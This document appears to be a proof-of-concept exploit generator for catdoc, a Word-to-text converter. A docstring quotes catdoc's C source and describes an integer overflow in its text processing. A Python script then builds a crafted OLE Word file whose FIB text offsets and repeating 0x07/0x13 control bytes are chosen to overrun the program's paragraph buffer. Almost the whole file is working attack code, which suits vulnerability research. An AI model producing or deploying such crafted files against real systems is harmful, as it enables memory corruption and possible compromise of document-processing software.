""" This is an integer overflow when processing the text inside a word document.

src/analyze.c:162-177
	/* skipping to textstart and computing textend */
	textstart=getlong(buffer,24);
	textlen=getlong(buffer,28)-textstart;
	textstart+=offset;
	if (verbose) {
		printf ("Textstart = %ld (hex %lx)\n",textstart+curpos,textstart+curpos);
		printf ("Textlen =   %ld (hex %lx)\n",textlen,textlen);
	}   
	for (i=0;i<textstart;i++) {
		catdoc_read(buf, 1, 1, f);
		if (catdoc_eof(f)) {
			fprintf(stderr,"File ended before textstart. Probably it is broken. Try -b switch\n");
			exit(1);
		}
	}    
	return process_file(f,textlen) || ret_code;

src/catdoc.h:142-146
/* Buffers for 32-bit and more program */
#define PARAGRAPH_BUFFER 262144
#define FILE_BUFFER 262144
#define PATH_BUF_SIZE 1024
#endif

src/reader.c:13-15
unsigned short int buffer[PARAGRAPH_BUFFER];
static unsigned char read_buf[256];
static int buf_is_unicode;

src/reader.c:93-182
int process_file(FILE *f,long stop) {
	int bufptr;
	int tabmode=0;
	long offset=0;
	int hyperlink_mode = 0;
	unsigned short c;
	/* Now we are starting to read with get_unicode_char */
	while (!catdoc_eof(f) && offset<stop) {
		bufptr = -1;
		do {
			c=get_unicode_char(f,&offset,stop);
...
			if (tabmode) {
				tabmode=0;
				if (c==0x007) {
					buffer[++bufptr]=0x1E;
					continue;
				} else {
					buffer[++bufptr]=0x1C;
				}  
			}   	 
			if (c<32) {
				switch (c) {
					case 0x007:
						tabmode = 1;
						break;
					case 0x000D:
					case 0x000B:
						buffer[++bufptr]=0x000A;
						break;
					case 0x000C:
						buffer[++bufptr]=c;
						break;
					case 0x001E:
						buffer[++bufptr]='-';
						break;
					case 0x0002: break;

					case 0x001F:
								 buffer[++bufptr]=0xAD;/* translate to Unicode
														  soft hyphen */
								 break;						  
					case 0x0009:
								 buffer[++bufptr]=c;
								 break;
					case 0x0013:
								 hyperlink_mode=1;
								 buffer[++bufptr]=' ';
								 break;
					case 0x0014:
								 hyperlink_mode = 0;
								 /*fall through */
					case 0x0015:
								 /* just treat hyperlink separators as
								  * space */
								 buffer[++bufptr]=' ';
								 break;
					case 0x0001: if (hyperlink_mode) 
									 	break;
								 /* else fall through */
					default:
								 bufptr=-1; /* Any other control char - discard para*/
				}
			} else if (c != 0xfeff) {
				/* skip ZERO-WIDTH-UNBREAKABLE-SPACE. Output anything
				 * else*/
				buffer[++bufptr]=c;
			}
		} while (bufptr<=PARAGRAPH_BUFFER-2 &&
				 !catdoc_eof(f) &&
				 buffer[bufptr]!=0x000a);
		if (bufptr>0) {
			buffer[++bufptr]=0;
			output_paragraph(buffer);
		}
	}
	return 0;
}
"""
import functools, operator, itertools, math, logging
import ptypes, office.storage, office.winword, office.tools
from office import storage, winword, tools
from ptypes import *

class u0(pint.uint_t): length = 0
class u8(pint.uint_t): length = 1
class u16(pint.uint_t): length = 2
class u32(pint.uint_t): length = 4
class u64(pint.uint_t): length = 8
class u128(pint.uint_t): length = 16
class s0(pint.sint_t): length = 0
class s8(pint.sint_t): length = 1
class s16(pint.sint_t): length = 2
class s32(pint.sint_t): length = 4
class s64(pint.sint_t): length = 8
class s128(pint.sint_t): length = 16

class parse_word_header(pstruct.type):
    _fields_ = [
        (winword.FibBase, 'fib'),
        (ptype.block, 'content'),
    ]

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 2:
        print("Usage: {:s} outfile".format(sys.argv[0] if sys.argv else __file__))
        sys.exit(1)

    # Create an empty structured storage document.
    destination = ptypes.prov.file(sys.argv[1], 'wb')
    storage.File(source=destination).a.commit(offset=0, source=destination)
    destination.close()

    # Load the document that we created, add 5 sectors for the fat, and grab it.
    store = storage.File(source=ptypes.prov.file(destination.file.name, 'rw'))
    store=store.l

    with tools.ModifyFat(store, markfat=True) as (_, out):
        out.extend(range(5))
    fat = store.Fat()

    # Now we can use it to add a sector for the directory entries.
    available = fat.availableEntries()
    with tools.ModifyDirectory(store) as (_, out):
        out[:] = [next(available)]

    # And add some sectors for the minifat.
    mfatsectors = fat.link(sector for _, sector in zip(range(2), available))
    fat.c, [fat[sector].d.a.c for sector in mfatsectors]
    with tools.ModifyMiniFat(store) as (_, out):
        out[:] = mfatsectors

    # We need a few sectors for the ministream, so allocate those first.
    minisectors = fat.link(sector for _, sector in zip(range(5), available))
    fat.c, [fat[sector].d.a.c for sector in minisectors]

    # Now we can add the directory entries. We need to add the root one first,
    # so that we can attach the ministream to it.
    directory = store.Directory()
    directory[0].alloc(Name='Root Entry', Type='Root', Flag='red')
    directory[0].set(sectLocation=minisectors[0], qwSize=fat.streamSize(len(minisectors)))
    directory.c

    # That should be mostly everything, so let's reload everything.
    store = store.l
    fat, mfat, directory = store.Fat(), store.MiniFat(), store.Directory()

    # Grab some sectors from the fat to store some data, and then use them to
    # add a directory entry that we can write to.
    sectors = fat.link(sector for _, sector in zip(range(fat.entries(262144)), fat.availableEntries()))
    fat.c, [fat[sector].d.a.c for sector in sectors]

    directory[1].alloc(Name='WordDocument', Type='Stream', Flag='black')
    directory.connect_child(0, 1)
    directory[1].set(sectLocation=sectors[0], qwSize=fat.streamSize(len(sectors)))
    directory.c
    print(directory)

    # Now we can write stuff to the directory entry.
    with tools.ModifyDirectoryEntryData(store, directory[1]) as (org, new):
        data = parse_word_header().a
        data['fib'].set(
            b={
                'fGlsy': True,
                'fComplex': True,
                'cQuickSaves': 7,
                'fReadOnlyRecommended': True,
                'fEncrypted': False,
            },
            b2={'fMac': sys.platform == 'darwin'},
            lKey=0xfeeddead,
            chs=0xdead,
            fcMin = 0,
            fcMac = 0x100,
        )
        data['content'].alloc(length=org.size() - data.size())

        pattern = itertools.cycle([7, 0x13])        # or [7] 
        data['content'].set(bytearray(itertools.islice(pattern, data['content'].size())))

        new.set(data.serialize())
        #new.load(source=ptypes.prov.proxy(org), length=org.size())
        #argh = itertools.chain(itertools.cycle(bytearray(range(0x100))))
        #new.set(bytearray(itertools.islice(argh, new.size())))

    sys.exit(0)
    store.source.close()
